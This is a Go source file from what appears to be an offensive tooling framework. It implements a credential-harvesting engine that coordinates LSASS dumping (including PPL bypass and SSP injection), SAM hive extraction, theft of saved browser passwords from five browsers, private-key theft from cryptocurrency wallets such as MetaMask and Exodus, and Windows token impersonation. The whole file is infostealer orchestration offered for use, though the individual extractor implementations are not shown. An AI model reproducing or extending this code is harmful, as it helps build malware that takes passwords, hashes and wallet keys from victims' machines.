package credential

import (
	"fmt"
	"sync"
	"time"

	"github.com/angel-platform/angel/pkg/logger"
	"github.com/angel-platform/angel/pkg/types"
)

type CredentialEngine struct {
	config         *CredentialConfig
	log            *logger.Logger
	mu             sync.RWMutex
	lsassExtractors map[LSASSMethod]LSASSExtractor
	samExtractors   map[SAMMethod]SAMExtractor
	browserExtractors map[BrowserType]BrowserExtractor
	walletExtractors map[WalletType]WalletExtractor
	tokenThieves    map[TokenMethod]TokenThief
	harvested       []*CredentialHarvest
}

func NewCredentialEngine(config *CredentialConfig) *CredentialEngine {
	if config == nil {
		config = DefaultCredentialConfig()
	}

	e := &CredentialEngine{
		config:            config,
		log:               logger.New("credential-engine", logger.LevelInfo),
		lsassExtractors:   make(map[LSASSMethod]LSASSExtractor),
		samExtractors:     make(map[SAMMethod]SAMExtractor),
		browserExtractors: make(map[BrowserType]BrowserExtractor),
		walletExtractors:  make(map[WalletType]WalletExtractor),
		tokenThieves:      make(map[TokenMethod]TokenThief),
		harvested:         make([]*CredentialHarvest, 0),
	}

	e.registerExtractors()
	return e
}

func (e *CredentialEngine) registerExtractors() {
	for _, method := range e.config.LSASSMethods {
		switch method {
		case LSASSForkDump:
			e.lsassExtractors[method] = NewForkDumpExtractor()
		case LSASSMiniDump:
			e.lsassExtractors[method] = NewMiniDumpExtractor()
		case LSASSProcDump:
			e.lsassExtractors[method] = NewProcDumpExtractor()
		case LSASSNanoDump:
			e.lsassExtractors[method] = NewNanoDumpExtractor()
		case LSASSPPLBypass:
			e.lsassExtractors[method] = NewPPLBypassExtractor()
		case LSASSSSPInjection:
			e.lsassExtractors[method] = NewSSPInjectionExtractor()
		case LSASSHooking:
			e.lsassExtractors[method] = NewHookingExtractor()
		}
	}

	for _, method := range e.config.SAMMethods {
		switch method {
		case SAMRegistryDump:
			e.samExtractors[method] = NewRegistryDumpExtractor()
		case SAMHiveExtract:
			e.samExtractors[method] = NewHiveExtractExtractor()
		case SAMVSSExtract:
			e.samExtractors[method] = NewVSSExtractExtractor()
		}
	}

	for _, browser := range e.config.Browsers {
		switch browser {
		case BrowserChrome:
			e.browserExtractors[browser] = NewChromeExtractor()
		case BrowserFirefox:
			e.browserExtractors[browser] = NewFirefoxExtractor()
		case BrowserEdge:
			e.browserExtractors[browser] = NewEdgeExtractor()
		case BrowserBrave:
			e.browserExtractors[browser] = NewBraveExtractor()
		case BrowserOpera:
			e.browserExtractors[browser] = NewOperaExtractor()
		}
	}

	for _, wallet := range e.config.WalletTypes {
		switch wallet {
		case WalletMetaMask:
			e.walletExtractors[wallet] = NewMetaMaskExtractor()
		case WalletPhantom:
			e.walletExtractors[wallet] = NewPhantomExtractor()
		case WalletExodus:
			e.walletExtractors[wallet] = NewExodusExtractor()
		case WalletElectrum:
			e.walletExtractors[wallet] = NewElectrumExtractor()
		}
	}

	for _, method := range e.config.TokenMethods {
		switch method {
		case TokenImpersonation:
			e.tokenThieves[method] = NewTokenImpersonationThief()
		case TokenDelegation:
			e.tokenThieves[method] = NewTokenDelegationThief()
		case TokenPrimary:
			e.tokenThieves[method] = NewTokenPrimaryThief()
		}
	}
}

func (e *CredentialEngine) Harvest(category string) ([]*types.Credential, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.log.Info("Starting credential harvest for category: %s", category)

	var allCreds []*types.Credential

	switch CredentialCategory(category) {
	case CategoryLSASS:
		creds, err := e.harvestLSASS()
		if err != nil {
			e.log.Warn("LSASS harvest failed: %v", err)
		}
		allCreds = append(allCreds, creds...)

	case CategorySAM:
		creds, err := e.harvestSAM()
		if err != nil {
			e.log.Warn("SAM harvest failed: %v", err)
		}
		allCreds = append(allCreds, creds...)

	case CategoryBrowser:
		creds, err := e.harvestBrowser()
		if err != nil {
			e.log.Warn("Browser harvest failed: %v", err)
		}
		allCreds = append(allCreds, creds...)

	case CategoryToken:
		creds, err := e.harvestTokens()
		if err != nil {
			e.log.Warn("Token harvest failed: %v", err)
		}
		allCreds = append(allCreds, creds...)

	case "all":
		for _, cat := range []CredentialCategory{CategoryLSASS, CategorySAM, CategoryBrowser, CategoryToken} {
			creds, err := e.Harvest(string(cat))
			if err != nil {
				e.log.Warn("Harvest failed for category %s: %v", cat, err)
			}
			allCreds = append(allCreds, creds...)
		}

	default:
		return nil, fmt.Errorf("unknown category: %s", category)
	}

	harvest := &CredentialHarvest{
		Category:  CredentialCategory(category),
		Timestamp: time.Now(),
	}
	e.harvested = append(e.harvested, harvest)

	e.log.Info("Harvested %d credentials for category: %s", len(allCreds), category)
	return allCreds, nil
}

func (e *CredentialEngine) harvestLSASS() ([]*types.Credential, error) {
	var allCreds []*types.Credential

	for method, extractor := range e.lsassExtractors {
		e.log.Info("Attempting LSASS extraction via %s", method)
		creds, err := extractor.Extract(e.config)
		if err != nil {
			e.log.Error("LSASS %s failed: %v", method, err)
			continue
		}
		allCreds = append(allCreds, creds...)
	}

	return allCreds, nil
}

func (e *CredentialEngine) harvestSAM() ([]*types.Credential, error) {
	var allCreds []*types.Credential

	for method, extractor := range e.samExtractors {
		e.log.Info("Attempting SAM extraction via %s", method)
		creds, err := extractor.Extract(e.config)
		if err != nil {
			e.log.Error("SAM %s failed: %v", method, err)
			continue
		}
		allCreds = append(allCreds, creds...)
	}

	return allCreds, nil
}

func (e *CredentialEngine) harvestBrowser() ([]*types.Credential, error) {
	var allCreds []*types.Credential

	for browser, extractor := range e.browserExtractors {
		e.log.Info("Attempting browser extraction from %s", browser)
		creds, err := extractor.Extract(e.config)
		if err != nil {
			e.log.Error("Browser %s extraction failed: %v", browser, err)
			continue
		}
		allCreds = append(allCreds, creds...)
	}

	return allCreds, nil
}

func (e *CredentialEngine) harvestTokens() ([]*types.Credential, error) {
	var allCreds []*types.Credential

	for method, thief := range e.tokenThieves {
		e.log.Info("Attempting token theft via %s", method)
		creds, err := thief.Extract(e.config)
		if err != nil {
			e.log.Error("Token %s failed: %v", method, err)
			continue
		}
		allCreds = append(allCreds, creds...)
	}

	return allCreds, nil
}

func (e *CredentialEngine) DumpLSASS() ([]*types.Credential, error) {
	e.log.Info("Dumping LSASS credentials")
	return e.harvestLSASS()
}

func (e *CredentialEngine) ExtractBrowser(browser BrowserType) ([]*types.Credential, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	extractor, ok := e.browserExtractors[browser]
	if !ok {
		return nil, fmt.Errorf("unsupported browser: %s", browser)
	}

	e.log.Info("Extracting credentials from %s", browser)
	return extractor.Extract(e.config)
}

func (e *CredentialEngine) ExtractSAM() ([]*types.Credential, error) {
	e.log.Info("Extracting SAM credentials")
	return e.harvestSAM()
}

func (e *CredentialEngine) ExtractWalletKeys(walletType WalletType) ([]WalletKey, error) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	extractor, ok := e.walletExtractors[walletType]
	if !ok {
		return nil, fmt.Errorf("no wallet extractor available for type: %s", walletType)
	}

	e.log.Info("Extracting wallet keys for type: %s", walletType)
	return extractor.ExtractKeys(e.config)
}

func (e *CredentialEngine) HarvestAll() (*CredentialHarvest, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	harvest := &CredentialHarvest{
		Timestamp: time.Now(),
	}

	for method, extractor := range e.lsassExtractors {
		e.log.Info("LSASS dump via %s", method)
		result := &LSASSResult{
			Method:    method,
			Timestamp: time.Now(),
		}
		creds, err := extractor.Extract(e.config)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Credentials = creds
		}
		harvest.LSASS = append(harvest.LSASS, result)
	}

	for method, extractor := range e.samExtractors {
		e.log.Info("SAM extraction via %s", method)
		result := &SAMResult{
			Method:    method,
			Timestamp: time.Now(),
		}
		creds, err := extractor.Extract(e.config)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Credentials = creds
		}
		harvest.SAM = append(harvest.SAM, result)
	}

	for browser, extractor := range e.browserExtractors {
		e.log.Info("Browser extraction from %s", browser)
		result := &BrowserResult{
			Browser:   browser,
			Timestamp: time.Now(),
		}
		creds, err := extractor.Extract(e.config)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Credentials = creds
		}
		harvest.Browser = append(harvest.Browser, result)
	}

	for wallet, extractor := range e.walletExtractors {
		e.log.Info("Wallet key extraction from %s", wallet)
		keys, err := extractor.ExtractKeys(e.config)
		if err != nil {
			e.log.Error("Wallet %s extraction failed: %v", wallet, err)
			continue
		}
		harvest.WalletKeys = append(harvest.WalletKeys, keys...)
	}

	for method, thief := range e.tokenThieves {
		e.log.Info("Token theft via %s", method)
		result := &TokenResult{
			Method:    method,
			Timestamp: time.Now(),
		}
		creds, err := thief.Extract(e.config)
		if err != nil {
			result.Error = err.Error()
		} else {
			result.Success = true
			result.Credentials = creds
		}
		harvest.Token = append(harvest.Token, result)
	}

	e.harvested = append(e.harvested, harvest)
	return harvest, nil
}

func (e *CredentialEngine) GetHarvested() []*CredentialHarvest {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*CredentialHarvest, len(e.harvested))
	copy(result, e.harvested)
	return result
}

func (e *CredentialEngine) SetLoggerLevel(level logger.Level) {
	e.log.SetLevel(level)
}
